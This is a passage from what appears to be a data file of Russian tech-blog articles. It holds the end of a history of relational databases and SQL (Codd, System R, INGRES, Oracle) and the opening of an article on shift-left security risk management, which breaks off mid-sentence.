OWNER). Такая ссылка на родителя есть у каждой дочерней записи.Продолжаем цикл (GO TO FIND-SUPPLY). Пока мы «гуляли» по множеству VENDOR_SUPPLY, множество PART_INFO помнило нашу текущую позицию. Теперь мы получаем следующую дочернюю запись (FIND NEXT SUPPLY).Находим и выводим родительскую запись множества типа VENDOR_SUPPLY (FETCH OWNER).Попытка получить следующую запись в множестве типа PART_INFO приводит к завершению цикла, и выполнение заканчивается.Как легко видеть, программа выводит всех поставщиков детали номер 15. Понравилось? Кстати, свою заметку Go To Statement Considered Harmful Эдсгер Дейкстра написал в 1968 году.И это очень простая программа. Можете себе представить, чего стоило написать и отладить какой-нибудь отчет, собирающий данные по нескольким десяткам сущностей, а потом — что самое печальное — поддерживать его.Что мы должны извлечь из этого примера, прежде чем двигаться дальше: сетевая база содержит не только данные, но и связи между ними, причем программист-навигатор должен эти связи знать, чтобы по ним перемещаться. Если мы добавим новые связи, программы придется переписать, чтобы они смогли ими воспользоваться.Начало 1970-x. Первый луч светаК нашему счастью, в это время в исследовательском центре IBM в Сан-Хосе (это сердце того района, который сейчас называется Кремниевой долиной) работал Эдгар Кодд.Тед, как называли Эдгара знакомые, думал над тем, как можно хранить и обрабатывать данные. Будучи математиком, он понял: раз данные — это множества записей, то и работать с ними можно как с множествами, математическими методами.Реляционная модельВ 1969 году Кодд написал внутренний отчет о своей работе (Derivability, Redundancy and Consistency of Relations Stored in Large Data Banks), который никто толком не понял, а в 1970-м опубликовал ставшую впоследствии знаменитой статью A Relational Model of Data for Large Shared Data Banks, в которой описал реляционную модель и ввел реляционную алгебру. Модель работает с отношениями. Алгебра дает набор операций (проекция, селекция, соединение…), который является замкнутым: выполняя любую операцию над отношениями, мы снова получаем отношение. Это дает возможность составлять из операций выражения любой сложности. Эти выражения и становятся запросами.В последующих статьях (A Data Base Sublanguage Founded on the Relational Calculus 1971 года, Relational Completeness of Data Base Sublanguages 1972 года) он расширил теорию и добавил реляционное счисление, основанное на логике предикатов первого порядка. Это выражения типа «существует такой поставщик, для которого верно...».Позвольте ограничиться этим кратким описанием и не вдаваться в подробности реляционной теории, они и без меня хорошо известны. Лучше обращу ваше внимание на то, что привычный нам термин database в то время состоял еще из двух отдельных слов data base, а иногда использовалось и data bank.Важно, что в реляционной модели связи между данными определяются самими данными, и больше ничем. Поэтому — продолжая пример — мы должны в поставку включить идентификаторы поставщика и детали:PART   (p#, desc) VENDOR (v#, name) SUPPLY (v#, p#, price)А ниже приведен пример того же запроса, выбирающего поставщиков детали 15, в нотации Кодда:s[v#]: SUPPLY(s) ∧ s[p#]=15Одна короткая и понятная строчка. В ней мы говорим, что переменная s – это поставка (SUPPLY), номер детали (p#) должен быть равен 15, и из поставки нас интересует номер поставщика (v#).Казалось бы, преимущество реляционной модели перед сетевой очевидно? Но не стоит думать, что идеи Кодда были немедленно приняты.Во-первых, были серьезные сомнения о реализуемости такого подхода. В сетевой модели путь доступа определял программист, а в реляционной? Написать выражение мы можем, а как его вычислять?Ситуация напоминала период первых языков высокого уровня. Когда Джон Бэкус придумал Фортран (тоже в IBM, кстати), он заявил, что программист не должен тратить свое время на возню с регистрами процессора, а вместо этого может просто написать формулу. Эта идея была воспринята в штыки профессионалами, привыкшими оптимизировать свой код на низком уровне. Чтобы преодолеть сопротивление, Бэкусу пришлось написать эффективный компилятор.Во-вторых, у IBM уже была своя система IMS (Information Management System), созданная еще в 1966 году по заказу НАСА для управления спецификацией материалов ракеты Сатурн-5. IMS использовала не сетевую модель, но похожую на нее — иерархическую. Естественно, никто не спешил бросать то, что приносит деньги. (IMS, кстати, до сих пор вполне себе жива, как и Кобол.)Кодд не унывал и рассказывал про свои идеи и наработки всем, до кого мог дотянуться. В 1972 году он доехал до исследовательского центра IBM в Йорктауне (IBM была богатой компанией со множеством исследовательских центров по всем Штатам).Среди слушателей были Дональд Чемберлин и недавно защитившийся Рэймонд Бойс. Они как раз изучали модель CODASYL и думали над возможными пути ее развития. Простота формул Кодда буквально ошарашила их и стала чем-тот вроде глотка свежего воздуха. Они поняли, что надо не развивать CODASYL, а заниматься реляционной моделью.Пришел Тед и начал придумывать из головы запросы и писать их на доске на своем реляционном языке. И они получались очень короткие и понятные.  ...  С той поры мне уже больше не хотелось работать с CODASYL.— Дон ЧемберлинРэя Бойса вы наверняка знаете, если слышали про нормальную форму Бойса — Кодда. Это тот самый Бойс. К сожалению, он очень рано умер от аневризмы, ему было всего 26, но все же успел оставить яркий след. А вот найти его достоверную фотографию было непросто (в сети попадаются разные, откровенно неправильные варианты).SQUAREИтак, Кодд вернулся в Сан-Хосе, а Дон и Рэй стали играть в запросы: придумывали задачи и пытались написать решение в реляционном стиле.Они быстро пришли к мысли, что простым программистам нужны не математические символы Кодда, а что-то более простое и понятное, похожее на язык программирования. Этот язык не должен строго следовать реляционной теории, но должен манипулировать множествами строк.В результате в 1973 году у них получился язык SQUARE (Specifying Queries as Relational Expressions).Строительный блок языка — «отображение» (mapping). Идея та же, что в реляционном счислении: берем отношение (SUPPLY), говорим, что номер детали (p#) должен быть равен 15, а нас интересует идентификатор поставщика (v#). Но Дон и Рэй решили отказаться от переменной, им показалось, что так проще.    SUPPLY    (15) v#         p#Отображения устраняют дубликаты, но иногда это не нужно, например, для вычисления агрегатной функции. В таком случае отношение указывается со штрихом:AVG (     SUPPLY'  (15))      price       p#Можно строить композицию отображений, получается аналог IN или соединения:    VENDOR   ○   SUPPLY  (15) name      v#   v#      p#Оказалось, что в IBM возникло несколько групп, заинтересовавшихся реляционной моделью, около дюжины человек, и в 1973 году было принято решение собрать их вместе и перевезти в Сан-Хосе, поближе к Кодду.Проект за неимением хороших идей назвали просто System R — реляционная система.Проект сразу разделили на две части. Группа RDS (Дон и Рэй) занималась языком. Группа RSS стала разрабатывать движок: формат хранения, индексы, блокировки, журналирование, транзакции — вот это вот все. Поскольку быстро разработать движок невозможно, для прототипа взяли уже готовый, не особо подходящий, но это дало возможность сразу экспериментировать с языком.Кстати, помимо научных статей, бесценным источником информации о ранних днях реляционных СУБД и о System R в частности является стенограмма The 1995 SQL Reunion: People, Projects, and Politics (есть и перевод на русский Сергея Дмитриевича Кузнецова; на том же сайте выложены его переводы множества полезных статей).SEQUELУ Дона и Рэя уже были наработки в виде SQUARE, но было понятно, что в таком двухэтажном виде язык не годится: запросы было удобно писать на доске, но трудно набирать на клавиатуре. Поэтому они свернули все в строчку и заменили математические символы простыми английскими словами. Заодно и отказались от терминов «отношение», «кортеж», «атрибут» в пользу всем понятных «таблица», «строка», «столбец».В идеале они хотели, чтобы «человек не в теме» мог хотя бы примерно понять, что делает запрос, и вообще старались сделать так, чтобы с базой данных мог взаимодействовать не программист, а пользователь. С этой целью в группе некоторое время даже работал лингвист. В итоге, как мы знаем, из этой затеи ничего не вышло, но первопроходцами быть трудно.SELECT v# FROM   SUPPLY WHERE  p# = 15Язык назвали SEQUEL. По сравнению со SQUARE он оброс такими конструкциями, как подзапросы и GROUP BY: SELECT name FROM   VENDOR WHERE  v# =        SELECT v#        FROM   SUPPLY        WHERE  p# = 15Причем сначала GROUP BY трактовался как «приставка» к FROM, а HAVING еще не придумали:SELECT v# FROM   SUPPLY GROUP BY v# WHERE  COUNT(p#) > 10Мне всегда было любопытно, кто первый додумался выравнивать запросы по нескольким вертикалям. Оказалось, что сами авторы это и придумали, запросы взяты из статьи 1974 года SEQUEL: A Structured English Query Language. А язык описывается в этой статье через нотацию SQUARE.Интересно, что Кодд не принимал непосредственного участия в проекте System R, хотя с ним, конечно, советовались. Он бы не особо доволен тем, что его строгая красивая теория компрометируется каким-то странным языком, не похожим на формулы, и держался на расстоянии. Впоследствии его критика стала настолько противоречить интересам компании, что он был вынужден покинуть IBM.А в это время в Калифорнийском университете в Беркли — не через дорогу, но прям рядом с Сан-Хосе — преподавали Майкл Стоунбрейкер и Юджин (Джин) Вонг.Стоунбрейкера мы конечно все хорошо знаем как основателя проекта POSTGRES, превратившегося в конечном счете в PostgreSQL. Сравнительно недавно, в 2014 году, Майклу тоже вручили премию Тьюринга.А тогда, в 1972 году, Стоунбрейкер получил грант на создание геоинформационной системы. Как утверждает Лоренс Роу в статье History of the Ingres Corporation, проект был назван INGRES в честь французского художника Jean Auguste Dominique Ingres, с подобранной расшифровкой Interactive Graphics and Retrieval System. Правда, французское имя произносится не Ингрес, а Энгр, поэтому не исключено, что и нам надо не мелочиться и вместо Постри говорить Постгр.Первая часть проекта была связана с графической системой для картографии, она нас не очень интересует. А вот вторая — с разработкой базы данных. Стоунбрейкер с Вонгом организовали семинар для изучения систем управления базами данных. В числе прочего они ознакомились со статьями Кодда и решили создать свою реляционную систему. Она унаследовала имя всего проекта — INGRES.В отличие от проекта System R, который, естественно, использовал мейнфреймы IBM, университет купил машину попроще, PDP-11. Говорят, сами Кен Томпсон и Денис Ритчи приезжали из Белл Лабс помогать с установкой на нее системы UNIX, которую буквально только что переписали с ассемблера на C.Стоунбрейкер решил рискнуть и вести разработку под недавно появившуюся ОС на недавно появившемся языке.QuelГруппа под руководством Вонга разработала язык, названный QUEL (query language). Его первая версия описана в статье 1974 года INGRES — A relational data base system.Сложно сказать, какое имя — QUEL или SEQUEL — появилось раньше, но получился такой вот каламбур. Вообще надо отметить, что отношения между группами в Сан-Хосе и в Беркли сложились напряженные: хотя группы работали рядом и фактически над одной и той же задачей, у них постоянно возникали споры о первенстве публикаций. Поэтому в итоге они практически не общались между собой, хотя, конечно, отслеживали статьи.QUEL довольно точно следовал идеям Кодда. Первый пример выглядит практически так же, как в нотации Кодда. Предложение INTO помещает выборку во временное отношение, для вывода на экран можно было написать INTO TERMINAL. Конечно, были оставлены «академические» понятия отношения, кортежа и атрибута, которые достались в наследство и Постгресу.RANGE OF S IS SUPPLY RANGE OF V IS VENDOR RETRIEVE INTO W(V.name)     WHERE V.v# = S.v# AND S.p# = 15QUEL отличался от SEQUEL большей строгостью, некоторые вещи в нем были продуманы лучше, в частности, агрегация.Второй запрос находит поставщиков, поставляющих более десяти деталей. Обратите внимание, что BY встроен внутрь агрегатной функции. Это дает возможность вкладывать одну группировку в другую.RETRIEVE INTO W(S.v#)     WHERE COUNT(S.p# BY S.v#) > 10Третий запрос находит поставщиков, у которых все детали стоят дороже, чем в среднем по всем поставщикам:RETRIEVE INTO W(S.v#) WHERE COUNT (S.p# BY S.v# WHERE S.price              >              AVG'(S.price BY S.p#))     = COUNT (S.p# BY S.v#)Здесь мы сравниваем количество деталей в разбивке по каждому поставщику (COUNT (S.p# BY S.s#)), но в первом выражении добавляем условие, которое выбирает только те детали, которые стоят дороже среднего. Штрих после AVG означает (как и в SEQUEL), что перед вычислением агрегатной функции из множества не удаляются дубликаты (разные поставщики могут продавать деталь по одной стоимости).Это выглядит очень непривычно, но запросы получаются весьма изящными и компактными.На дворе 74-й год. На конференции ACM SIGMOD состоялся «великий спор» между сторонниками реляционной и сетевой моделей. Астрономы знают, у них был свой великий спор, а у нас вот — свой.При подготовке к выступлению Кодд проанализировал пример простого приложения, управляющего магазином. В решении в стиле CODASYL он насчитал около десятка типов операций, всего более 60 операторов. При реляционном подходе потребовалось всего 3 оператора!Победили хорошие парни.— Крис Дейт«Великий спор» стал одним из переломных моментов в становлении реляционного подхода, но не был окончательной победой. Оппоненты снова отметили, что эффективность остается под вопросом.Вторая половина 1970-x. Борьба за скоростьSystem RПолучив определенный опыт, команда System R начала создавать СУБД заново, уже без заглушек и временных решений. Отчетная статья System R: Relational Approach to Database Management вышла в 1976 году.Команда RDS во главе с Доном Чемберлином создала вторую версию языка SEQUEL (SEQUEL 2: A Unified Approach to Data Definition, Manipulation, and Control, 1976). Она включала и DDL, и DML, в ней уже появилось ключевое слово HAVING. Поддерживались не только транзакции, но и операция ASSERT и триггеры. Были реализованы курсоры и представления. Язык значительно подрос.В 1977 году произошел забавный юридический казус: оказалось, что имя SEQUEL уже занято какой-то компанией. Тогда Дон выкинул гласные и получилось SQL, что рифмовалось с APL, CPL и прочими трехбуквенными именами на PL.Так язык получил современное название. Но по-прежнему есть два общепризнанных произношения: эс-ку-эл и сиквел. В английском это доставляет определенные хлопоты из-за артиклей: как правильно, an SQL или a SQL? В документации Постгреса не так давно разбирались, какой артикль оставить, и сошлись на an.Команда RSS тем временем заменила временное решение собственным движком, который учитывал особенности системы.И оказалось, что оптимизированный и скомпилированный запрос представляет собой очень короткий фрагмент кода, вызывающий RSS. Тогда родилась идея запоминать этот код и использовать его до тех пор, пока не меняется структура данных. Получился такой гибрид подготовленного оператора и JIT-компиляции (1979 год!). Это очень сильно экономило время для запросов, которые выполнялись неоднократно, и позволило показать на эталонных тестах производительность на уровне нереляционных систем — что было очень важно.RSS (движок) состоял из 35000 строк кода на языке PL/S (это IBM-овская версия PL/I для системного программирования), а RDS (язык) — из 38000 строк на PL/I и 9000 строк на ассемблере.System R работала на 32-битных машинах IBM System/370 (например, Model 168) с несколькими мегабайтами ОЗУ. По вычислительной мощности это где-то на уровне 486DX2. Размеры баз данных были в пределах 200 мегабайт, а количество одновременно работающих пользователей обычно не превышало 10 человек.Постепенно System R стали показывать потенциальным заказчикам. Первыми клиентами стали авиационные компании — Pratt & Whitney, Boeing (база данных хранила поставщиков и детали — все как в примерах из учебника), Upjohn Drug Co. (производство лекарств; база данных хранила результаты клинических испытаний).Клиенты остались довольны. Но исследовательским проектам всегда тяжело обратить на себя внимание и пробиться в промышленное производство. Флагманским продуктом IBM оставалась IMS, а основные силы были брошены на грандиозный проект-преемник под названием Eagle, который должен был уметь почти все. Попытки System R обратить на себя внимание привели лишь к тому, что в спецификацию этого монстра добавили еще и поддержку реляционной модели.Команда System R никогда не была большой — несколько десятков человек в пике, — но рассказать обо всех у меня не получится. Однако двух людей я хотел бы отметить особо.Первый — Джим Грей. Джим занимался (в числе прочего) всем, что связано с транзакциями и согласованностью. Смотрите, например, статьи The notions of consistency and predicate locks in a database system (1976 год) и The Recovery Manager of the System R Database Manager (1981 год).Джим формализовал понятие транзакции (известное, конечно, и раньше); благодаря его работам появилось всем сейчас известная аббревиатура ACID, на которую все ссылаются, но мало кто понимает. Он исследовал гранулярность блокировок, двухфазную фиксацию.В 2007 году Джим пропал без вести на своей яхте; с 2012 считается погибшим.Патрисия Селинджер занималась оптимизатором System R. В своей работе Access Path  Selection in a Relational Database Management System 1979 года она описала стоимостной оптимизатор.Пат предложила математическую модель для вычисления стоимостей на основе статистики. Статистика предполагала равномерное распределение (гистограмм не было). Модель учитывала и доступ к страницам, и ресурсы процессора, а также принимала во внимание наличие буферного кеша. Было два метода соединения: Nested Loops и Merge Join (хеширования не было). Из-за соединения слиянием учитывался и порядок сортировки в узлах.Патрисия предложила алгоритм динамического программирования и ряд эвристик для сокращения пространства поиска. По-моему, это удивительно: в 1979 году был создан планировщик абсолютно современного уровня. Да, за прошедшие десятилетия планировщики шагнули вперед, но Патрисия абсолютно точно «угадала» тот подход, который мы до сих пор используем.IngresПервопроходцами быть трудно. К сожалению, авторам INGRES не так повезло, они сделали менее точные предположения, чем их коллеги из IBM.Они решили, что транзакция всегда состоит из одного оператора, а блокировки должны захватываться на уровне отношений, а не строк (Джим Грей удивлялся этому решению, и впоследствии оказалось, что он был прав).Восстановление после сбоев было сочтено не слишком критичным — ну, академическая среда, — поэтому не были разработаны утилиты резервного копирования. Запросы каждый раз разбирались и оптимизировались заново — не было компиляции, как в System R.Зато с самого начала было уделено внимание расширяемости — конек Стоунбрейкера, та идея, которую он привнес и в Постгрес.Разработчиком оптимизатора был Юджин Вонг. Он боялся, что полноценная оптимизация будет слишком дорогой (PDP-11 — 16-битная машина; даже топовая модель PDP-11/70 уступала по мощности IBM 370, а на ней соединение 8 таблиц выполнялось в System R несколько секунд). Поэтому Вонг реализовал иной подход: сначала оптимизатор выбирал два отношения, выполнялось их соединение, и на основе полученных (точных!) цифр кардинальности выбиралось отношение для следующего соединения. В каких-то случаях этот подход работал хорошо, но в целом качество оптимизации сильно уступало System R. К тому же поддерживались только вложенные циклы.Тем не менее система была установлена в нескольких сотнях мест — как правило, в университетах, куда попадала вместе с PDP-11 и Unix. Состояла она из 75000 строк кода на языке C.Отчетная статья The Design and Implementation of INGRES вышла в 1976 году.В 1977 году на полупустой еще поляне появился третий игрок: Ларри Эллисон с товарищами основал компанию SDL, позже переименованную в RSI.Эллисон делал некий проект, названный Oracle, и ему нужна была СУБД. Он прочитал работы Кодда, узнал о прототипе, которым занималась IBM, и решил сделать собственную СУБД, но коммерческую. Чтобы было проще переманивать клиентов, он хотел, чтобы она была совместима с System R. Поэтому он взял язык SQL, синтаксис и BNF которого были опубликованы.Он даже хотел получить список кодов ошибок, но не преуспел. Правда, один код все же промелькнул в статье Support for Repetitive Transactions and Ad-hoc Query in System R:$SELECT DESCRIP,QOH,QOO INTO $DESCRIP,$QOH,$QOO      FROM PARTS WHERE PARTNO=$PARTNO; IF SYR_CODE = 0 THEN      Write DESCRIP, QOH, QOO on terminal; ELSE IF SYR_CODE = 100 THEN      Write 'THERE IS NO SUCH PART' on terminal; ELSE CALL TROUBLE('SELECT');Теперь можете поразмышлять, почему в Oracle все коды ошибок отрицательные, кроме 100 для no_data_found.В 1979 году выпустили вторую версию СУБД, написав ее на ассемблере PDP-11. Она унаследовала имя проекта: Oracle. Первую версию Эллисон решил пропустить — вторая выглядела солиднее.Oracle v2 не поддерживала транзакций, не имела оптимизатора (таблицы просто соединялись в том порядке, в котором были указаны в запросе), ломалась каждый день так, что приходилось загружать данные заново. Но система работала на небольшой машине, предоставляла SQL, приносила клиентам пользу и поэтому продавалась.Исходный код выглядел так, словно они прочитали статью про SQL, сели за компьютер и начали программировать. Все структуры данных напрямую отображали язык в аппаратуру безо всяких промежуточных слоев. «Так, вот у нас блок запроса, вот у него предложение select...».— Роджер БэмфордТак начался период коммерциализации.1980-е. Коммерциализация и окончательная победаIngresВ чем Oracle был хорош, так это в агрессивном маркетинге. Утверждалось, что они создали самую быструю СУБД. Один бывший студент Стоунбрейкера усомнился в этом и решил сравнить производительность Oracle и INGRES, благо они работали на одной и той же машине — PDP-11. К удивлению команды INGRES, Oracle оказался позади.Тогда-то стало понятно, что пора выходить на рынок. В 1980-м были найдены инвесторы и основана компания Relational Technology Inc. Основатели — Стоунбрейкер, Вонг и профессор из Беркли Лоренс Роу.Университетская разработка продолжалась параллельно и независимо, студентов к работе над коммерческой версий не привлекали: студентам нужны исследования, а продукту нужна поддержка, багфиксинг и другие скучные вещи.В первую очередь занялись всякими улучшениями: кешированием дерева разбора, написанием недостающих утилит, реализацией полноценных транзакций и гранулярных блокировок.В 1982 году Боб Куи переписал оптимизатор на модель Пат Селенджер (Query Optimization in INGRES), и тогда стало совсем хорошо. (В Oracle стоимостной оптимизатор появился только в 1992 году, и тоже при участии Боба.)Посмотрев на весь этот коммерческий движ, IBM решила запустить свой пробный шар. В подразделении IBM в Эндикотте освободилась группа разработчиков, и ей решили поручить сделать из System R продукт. Все мы понимаем разницу между продуктом и прототипом, сделанным учеными на коленке.Группа не была знакома с базами данных, так что, трезво оценив свои силы, они решили взять код System R и причесать его, доведя до промышленного уровня.И вот в 1981 году IBM объявила о выходе своей первой коммерческой реляционной СУБД — SQL/DS, — предназначенной для младших машин серии.Увидев интерес заказчиков к реляционным технологиям, IBM отказалась от полуживого колосса Eagle и бросила основную команду разработчиков из Санта-Терезы (лаборатория в Сан-Хосе) на реляционную базу крупного масштаба для MVS (Multiple Virtual Storage; ныне z/OS). На этот раз код был переписан с нуля, но вдохновение разработчики снова черпали в коде System R, иначе они не выпустили бы первую версию так быстро: официальный релиз состоялся в 1983.Для понимания: в это время IMS принадлежало 50% рынка СУБД, хотя новые продажи и падали. То есть старые системы не то, чтобы быстро сдавали свои позиции, но переход IBM на реляционную сторону убедил всех, что будущее именно за реляционными базами....IBM благословил реляционные СУБД. Все понимали: если уж IBM что-то решил, то теперь это стратегическое направление. — Лоренс РоуНу а кульминацией, на которой я бы хотел поставить точку, стало появление первого стандарта SQL в 1986 году (ANSI), в 1987 году он был принят как международный (ISO).Стандарт был полностью продиктован реализацией System R. Представитель комитета изучил System R и все аккуратно записал в формальном виде, включая все странности и случайные решения, вызванные простой нехваткой времени на реализацию (вроде того, что GROUP BY не допускается в запросах с UNION).Получился небольшой документ на 120 страниц. В нем еще не было дат, первичных и внешних ключей, внешних соединений (был только синтаксис с запятой). Занятно, что говорилось про единственный уровень изоляции — Serializable, а остальные появились уже в стандарте 92-го года. Тем не менее язык включал такие операторы и конструкции, как BETWEEN, IN, EXISTS, LIKE, IS NULL, подзапросы, курсоры, SELECT ... FROM ... WHERE ... GROUP BY ... HAVING.Принятие стандарта поставило точку в вопросе о том, какой язык останется на рынке. Ingres перешел на SQL в конце 1980-х. Postgres, который Стоунбрейкер запустил в 1986 году, использовал PostQuel, но в 1994 году, после передачи проекта сообществу, сразу перешел на SQL. О былых временах напоминает только библиотека libPQ, буквы PQ в имени которой означают не что иное, как PostQuel."
6,"Безопасность мертва, да здравствует риск-менеджмент",OTUS,Цифровые навыки от ведущих экспертов,0,"Консалтинг и поддержка, Рекрутинг и HR, Производство мультимедиа-контента",2025-04-10,"Руководство по переосмыслению риск-менеджмента в современной разработке программного обеспечения для IT-директоров.Шон Маккарти — вице‑президент и главный архитектор отдела глобальной архитектуры, рисков и управления в Manulife.Традиционные подходы к обеспечению безопасности все больше теряют свою актуальность для современных технологических лидеров, которым нужно ориентироваться в сложном и постоянно меняющемся ландшафте угроз. Управление информационными рисками больше не может быть одним из обязательных мероприятий под конец разработки, оно должно быть интегрировано на протяжении всего жизненного цикла программного обеспечения. По мере того как регулирующие органы предъявляют все более строгие требования к обеспечению безопасности и соответствию стандартам, организации вынуждены кардинально пересмотреть свой подход к риск‑менеджменту. Вместо того чтобы реагировать на угрозы, они должны действовать на опережение, обеспечивая безопасность на всех этапах.«Сегодня регулирующие органы уже не довольствуются только фреймворками, документацией и проверкой достоверности аудита. Они требуют реальных доказательств, включая комплексное тестирование и управление программами комплаенса, которые должны быть интегрированы в повседневные операционные процессы.» — 2025 Banking Regulatory Outlook, Deloitte И эта тенденция очевидна. В современной цифровой экономике бизнес‑цели, такие как «стать надежным финансовым партнером» или «защита данных клиентов при внедрении инноваций», требуют не только технического контроля и документации. Необходимо переосмыслить подход к интеграции безопасности и комплаенсу на каждом этапе создания программного обеспечения. Основные тезисы: Традиционные подходы к обеспечению безопасности, которые сосредоточены на проверке безопасности на поздних стадиях разработки, уже не отвечают современным требованиям бизнеса и регулирующих органовУспешная трансформация требует перехода от образа мышления «охранника» к образу мышления «доверенного советника»Успех зависит от соблюдения четырех ключевых принципов: совместной работы, автоматизации, наглядности и предотвращенияИзмерение состояния безопасности с помощью четко определенных показателей позволяет управлять рисками на основе данныхКультурная трансформация и развитие потенциала столь же важны, как и технический контрольОжидаемые преимущества:Сокращение задержек при поставке программного обеспечения, связанных с безопасностьюСнижение числа уязвимостей и инцидентов после релизаСнижение затрат на устранение последствий за счет раннего выявления проблемПовышение соответствия нормативным требованиям и готовности к аудитуБолее тесное сотрудничество между командами безопасности и разработчиковБолее надежная система безопасности с минимальными трудностями при поставкеI. Современные задачи безопасности: Риски в Стране чудес В знаменитой книге Льюиса Кэрролла «Алиса в Стране чудес» есть сцена, где Красная Королева произносит фразу: «Сначала казнь! Потом приговор!». Этот абсурдный подход к правосудию напоминает то, как многие современные организации решают проблемы безопасности: они вводят меры контроля только после завершения разработки, когда внесение изменений становится особенно дорогим и разрушительным. Такой подход порождает конфликты, в которых отдел безопасности воспринимается как источник проблем, а не как жизненно важный партнер, способствующий созданию безопасного программного обеспечения.Традиционный подход не оправдывает ожиданийПредставьте себе город, в котором проверки зданий проводятся только после завершения строительства. Застройщики могут понести огромные расходы, если структурные проблемы будут обнаружены слишком поздно. В таком случае им придется тратить значительные средства на дорогостоящие исправления или даже полную реконструкцию. К сожалению, многие организации до сих пор придерживаются такого же подхода к обеспечению информационной безопасности. Они ждут, пока разработка почти завершится, прежде чем проводить проверки безопасности, пенетрационные тесты и нормоконтроль.Цена обеспечения безопасности на поздних стадияхОрганизации, которые придерживаются традиционных подходов к безопасности, сталкиваются с рядом проблем: Дорогостоящая доработка и задержка релизаВраждебные отношения между подразделениями безопасности и разработки Растущий долг безопасности Повышенная уязвимость к угрозам Растущие операционные риски Проблемы с соблюдением требований и контроль со стороны регулирующих органов II. Эволюция риск-менеджментаВ рамках современной информационной безопасности важно мыслить как доверенный советник, а не как строгий контролер. Это означает создание условий для безопасной разработки, одновременно поддерживая целостность системы и соответствие нормативным требованиям.От охранника до градостроителя:ТРАДИЦИОННЫЙ ПОДХОД СОВРЕМЕННЫЙ ПОДХОД Анализ безопасности на завершающем этапе разработкиБезопасность в требованиях Ручной нормоконтрольАвтоматическое применение политик Безопасность как средство блокировки Безопасность как средство обеспечения Безопасность в масштабах проекта Безопасность в масштабах продукта Защита периметра Принципы нулевого доверия Теперь представьте себе мир, в котором разработчики имеют доступ к предварительно утвержденным шаблонам безопасности, автоматическим комплаенс‑проверкам и четким рекомендациями по безопасности, которые позволяют надежно и быстро создавать приложения, обеспечивая при этом защиту. В этом заключается суть современной интеграции безопасности: предоставление более высокого уровня строительных блоков безопасности, которые способствуют внедрению инноваций и быстрой реорганизации бизнеса, сохраняя при этом целостность системы. Вместо того чтобы требовать от каждой команды быть экспертами по безопасности, мы разрабатываем платформы и шаблоны, которые упрощают процесс, обеспечивая при этом высокое качество и согласованность.III. “Что”: Стратегический подход к безопасности  В условиях, когда важно находить баланс между гибкостью бизнеса, соблюдением нормативных требований и обеспечением безопасности, ключом к успеху становится совершенствование вашего подхода к безопасности. Средства безопасности должны способствовать быстрому созданию ценности для бизнеса, одновременно обеспечивая надежную защиту от угроз.Крайне важно, чтобы подразделения безопасности были сосредоточены на поддержке бизнеса, а не только на защите. Это подразумевает активное понимание как бизнес‑целей, так и планируемых путей реализации, а затем плавную интеграцию системы безопасности в эти процессы.Переход к «Shift‑Left» системам безопасности представляет собой значительный культурный сдвиг. Безопасность больше не воспринимается как нечто, что появляется только на финише разработки, а становится неотъемлемой частью всего процесса. Преобразование требований безопасности в практические рекомендации и инструменты контроля позволяет командам, занимающимся разработкой, создавать безопасные системы с самого начала.Основные области, требующие внимания:Соответствие между возможностями обеспечения безопасности и готовностью бизнеса к рискуПереход от контрольных точек к системному обеспечению безопасностиФреймворки для измерения эффективности безопасности Требования к культурной трансформации Модели эффективного межкомандного сотрудничестваМетоды определения приоритетов инвестиций в безопасностьАвтоматизированный комплаенс‑мониторингСтратегии обеспечения безопасности инновацийТочно так же, как безопасность города зависит от применения строительных норм на начальных этапах планирования, наша стратегия безопасности должна быть интегрирована на протяжении всего жизненного цикла проекта. Такая интеграция позволит добиться серьезных бизнес‑ценностей: сокращения количества инцидентов, повышения готовности к соблюдению нормативных требований и укрепления доверия клиентов.IV. “Как”: Создание безопасных цифровых продуктов 1. Безопасность в анализе требованийНачало диалога: «Как нам сделать так, чтобы безопасность учитывалась с самого начала?»Подобно тому, как мы изучаем строительные нормы перед составлением архитектурных планов, требования безопасности должны быть установлены на ранних этапах процесса разработки.ОБЛАСТЬ ДЕЯТЕЛЬНОСТИ КЛЮЧЕВЫЕ ВИДЫ ДЕЯТЕЛЬНОСТИВЛИЯНИЕ НА БИЗНЕС Оценка рисков — Тщательная оценка средств контроля — Проверка подлинности и авторизации — Планирование защиты данных — Требования к проверке входных данных — Снижение затрат на исправление ошибок— Улучшение комплаенса— Повышение доверия клиентов Анализ проектных решений— Планирование сегментации сети — Анализ безопасности потоков данных — Архитектура безопасности приложений — Внедрение системы с нулевым уровнем доверия — Устойчивость системы — Углубленная защита — Сокращение пространства для атаки — Комплаенс заложен в архитектуруКлассификация данных— Стандарты классификации информации— Выбор соответствующих элементов управления — Сопоставление требований к конфиденциальности — Согласование с нормативными актами — Соблюдение нормативных требований — Предотвращение утечек данных — Соответствующие уровни защиты — Оптимизация ресурсов 2. Безопасность в анализе проектных решенийНачало диалога: «Как мы выявляем и устраняем риски безопасности в нашей архитектуре?»Подобно тому, как градостроители стремятся предотвратить преступления с помощью экологического дизайна, безопасность в проектировании сосредоточена на раннем выявлении и минимизации угроз.ОБЛАСТЬ ДЕЯТЕЛЬНОСТИ КЛЮЧЕВЫЕ ВИДЫ ДЕЯТЕЛЬНОСТИ ВЛИЯНИЕ НА БИЗНЕСМоделирование угроз — Систематическая идентификация рисков — Анализ векторов атак — Профили потенциальных злоумышленников — Оценка влияния на бизнес — Упреждающее снижение рисков — Целевые средства контроля безопасности — Обоснованные инвестиционные решения — Снижение уязвимостей Шаблоны защиты — Предварительно утвержденные шаблоны безопасности — Эталонные архитектуры безопасности — Рекомендации по внедрению — Примеры передовой практики— Ускорение разработки — Согласованная безопасность — Уменьшение конструктивных недостатков — Повторное использование знанийАнализ проектных решений — Оценка архитектуры безопасности — Оценка эффективности контроля — Валидация паттернов проектирования — Рекомендации экспертов — Повышение качества проектирования — Раннее обнаружение дефектов — Оптимизированные средства управления — Уменьшение технического долга 3. Безопасность при сборке и тестированииНачало диалога: «Как нам обеспечить безопасность кода до того, как он будет запущен в продакшене?» Подобно инспекциям зданий, проводимым на протяжении всего строительства, тестирование безопасности должно быть интегрировано в процесс разработки.ОБЛАСТЬ ДЕЯТЕЛЬНОСТИ КЛЮЧЕВЫЕ ВИДЫ ДЕЯТЕЛЬНОСТИ ВЛИЯНИЕ НА БИЗНЕСБезопасное программирование— Внедрение стандартов написания кода— Обучение разработчиков безопасности — Экспертные оценки кода — Фреймворки безопасности — Меньшее количество уязвимостей — Компетентность разработчиков — Стабильное качество — Сокращение инцидентов Автоматизированное тестирование — Статическое тестирование безопасности приложений — Анализ состава программного обеспечения — Скрытое сканирование — Сканирование безопасности контейнеров — Непрерывная проверка — Раннее 